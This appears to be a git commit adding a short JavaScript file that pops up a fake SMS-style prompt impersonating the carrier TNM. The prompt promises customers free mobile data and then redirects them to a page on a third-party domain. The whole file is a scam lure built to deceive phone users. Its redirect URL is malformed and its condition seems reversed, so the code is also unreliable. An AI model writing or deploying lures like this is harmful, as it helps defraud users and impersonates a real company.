0bfbbbceef56930d3e99041f021b515c808430f7
legitips <83867893+legitips@users.noreply.github.com>
2024-08-26 17:30:34 -0700

    Create activation-tnmdataoffer.js

---
+++ activation-tnmdataoffer.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('TNM SMS: Dear customer, kindly check if your Tnm sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://https://legitips.xyz/tnmdataoffer.html';
+}
